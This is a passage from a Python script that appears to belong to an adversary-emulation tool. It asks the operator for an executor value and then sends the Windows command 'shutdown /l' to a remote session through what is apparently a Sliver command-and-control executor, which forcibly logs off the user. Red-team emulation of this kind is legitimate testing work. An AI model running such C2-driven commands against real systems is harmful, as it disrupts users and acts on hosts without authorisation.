            f"[bold]➤ Enter value for Executor (default: {default_val}, required: {required_val}): [/]"
        ) or default_val
        if not user_input and True:
            raise ValueError("Missing required parameter: Executor")
        user_params["Executor"] = user_input
        pddl_parameters["executor4"] = user_input

    confirm_action()
    commands = """
    shutdown /l 

    """
    log_command_execution()
    await sliver_executor.cmd(session_id=executor_dict["executor4"]["RealSessionID"],input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
